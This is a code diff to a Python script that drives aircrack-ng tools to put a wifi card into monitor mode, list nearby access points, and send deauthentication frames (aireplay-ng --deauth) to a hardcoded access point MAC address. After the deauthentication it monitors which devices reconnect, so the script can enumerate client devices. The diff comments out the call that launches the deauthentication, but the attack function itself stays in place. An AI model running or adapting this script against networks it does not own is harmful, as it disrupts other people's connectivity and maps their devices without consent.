@@ -1,12 +1,13 @@
 import subprocess
 import time
+import threading
 
 interface = "wlp0s20f3"
 
-# Returns a list containing every MAC address of every access point (AP) detected and its channel
-def scan_access_points(interface):
 
-    # Kill network processes before putting the interface in monitor mode
+# Set the the wifi interface to monitor mode
+def monitor_mode(wifi_interface):
+     # Kill network processes before putting the interface in monitor mode
     try:
         subprocess.run(["sudo", "airmon-ng", "check", '"kill'], check=True)
     except subprocess.CalledProcessError as e:
@@ -15,10 +16,32 @@ def scan_access_points(interface):
 
     # Enable monitor mode
     try:
-        subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)
+        subprocess.run(["sudo", "airmon-ng", "start", wifi_interface], check=True)
     except subprocess.CalledProcessError as e:
         print("Error enabling monitor mode:", e)
         exit(1)
+
+
+# Set the wifi interface back to managed mode
+def managed_mode(wifi_interface):
+     # Disable monitor mode
+    try:
+        subprocess.run(["sudo", "airmon-ng", "stop", wifi_interface+"mon"], check=True)
+    except subprocess.CalledProcessError as e:
+        print("Error disabling monitor mode:", e)
+        exit(1)
+    
+    # Restore the network manager (will enable back wifi)
+    try:
+        subprocess.run(["sudo", "service", "NetworkManager", "start"])
+    except subprocess.CalledProcessError as e:
+        print("Eror restoring the Network Manager:", e)
+        exit(1)
+
+
+
+# Returns a list containing every MAC address of every access point (AP) detected and its channel
+def scan_access_points(interface):
 
     try:
         AP_MAC_addr = []
@@ -37,7 +60,6 @@ def scan_access_points(interface):
         with open("output-01.csv", "r") as csvfile:
             lines = csvfile.readlines()
             for line in lines[2:]:  # Skip the header
-                print(line)
                 parts = line.strip().split(',')
 
                 # Stop at the end of the AP addresses in the CSV file
@@ -60,59 +82,33 @@ def scan_access_points(interface):
         exit(1)
 
 
-    # Disable monitor mode
-    try:
-        subprocess.run(["sudo", "airmon-ng", "stop", interface+"mon"], check=True)
-    except subprocess.CalledProcessError as e:
-        print("Error disabling monitor mode:", e)
-        exit(1)
-    
-    # Restore the network manager (will enable back wifi)
-    try:
-        subprocess.run(["sudo", "service", "NetworkManager", "start"])
-    except subprocess.CalledProcessError as e:
-        print("Eror restoring the Network Manager:", e)
-        exit(1)
-
-
     return AP_MAC_addr
 
 
 # Function that sends deauth packets to all the devices of the AP_MAC_address 
 def deauth_attack(AP_MAC_address, channel):
 
-    # Enable monitor mode on a specific channel
+    # Change the channel of the wifi interface in monitor mode (needed for deauth attacks)
     try:
-        subprocess.run(["sudo", "airmon-ng", "start", interface, channel], check=True)
+        subprocess.run(["sudo", "iw", "dev", interface + "mon", "set", "channel", channel])
     except subprocess.CalledProcessError as e:
-        print("Error enabling monitor mode:", e)
+        print("Error changing channels")
+
+    try:
+        print("Sending deauthentication frames to the AP: " + str(AP_MAC_address))
+        deauth_process = subprocess.Popen(["sudo", "aireplay-ng", "--deauth", "0", "-a", AP_MAC_address ,  interface + "mon" ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        time.sleep(5)
+        deauth_process.terminate()
+    except subprocess.CalledProcessError as e:
+        print("Error sending deauthentication frames:", e)
         exit(1)
 
-    print("Sending deauthentication frames to the AP: " + str(AP_MAC_address))
-    deauth_process = subprocess.Popen(["sudo", "aireplay-ng", "--deauth", "0", "-a", AP_MAC_address ,  interface + "mon" ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    time.sleep(15)
-    deauth_process.terminate()
-
-    # Disable monitor mode
-    try:
-        subprocess.run(["sudo", "airmon-ng", "stop", interface+"mon"], check=True)
-    except subprocess.CalledProcessError as e:
-        print("Error disabling monitor mode:", e)
 
 
 
 
-
-# Function that monitors the traffic of a specific access point and
+# Function that monitors the traffic of a specific access point
 def monitor(AP_MAC_address):
-
-     # Enable monitor mode on a specific channel
-    try:
-        subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)
-    except subprocess.CalledProcessError as e:
-        print("Error enabling monitor mode:", e)
-        exit(1)
-
 
     device_addr = []
     try:
@@ -147,12 +143,6 @@ def monitor(AP_MAC_address):
         print("Error deleting csv file")
         exit(1)
 
-    try:
-        subprocess.run(["sudo", "airmon-ng", "stop", interface+"mon"], check=True)
-    except subprocess.CalledProcessError as e:
-        print("Error disabling monitor mode:", e)
-
-
     return device_addr
     
 
@@ -161,25 +151,10 @@ def monitor(AP_MAC_address):
 # Returns a list containing all the devices connected to a specific access point address
 def scan_devices(AP_MAC_address, channel):
 
-    # Kill network processes before putting the interface in monitor mode
-    try:
-        subprocess.run(["sudo", "airmon-ng", "check", '"kill'], check=True)
-    except subprocess.CalledProcessError as e:
-        print("Error killing network processes:", e)
-        exit(1)
-
-
     # First deauthenticate all the devices of the access point mac address
-    deauth_attack(AP_MAC_address,channel)
+    #deauth_attack(AP_MAC_address,channel)
     # Then monitor to see who reconnects
     devices = monitor(AP_MAC_address)
-
-    # Restore the network manager (will enable back wifi)
-    try:
-        subprocess.run(["sudo", "service", "NetworkManager", "start"])
-    except subprocess.CalledProcessError as e:
-        print("Eror restoring the Network Manager:", e)
-        exit(1)
 
 
     return devices
@@ -187,10 +162,7 @@ def scan_devices(AP_MAC_address, channel):
 
 
 
-if __name__ == "__main__":
-
-    #target_APs = scan_access_points(interface)
-    #print(target_APs)
-
-    MAC_devices = scan_devices("F4:06:8D:B7:75:F9", "6")
-    print(MAC_devices)
+#monitor_mode(interface)
+#devices = scan_devices("F4:06:8D:B7:75:F9", "6")
+#print(devices)
+#managed_mode(interface)
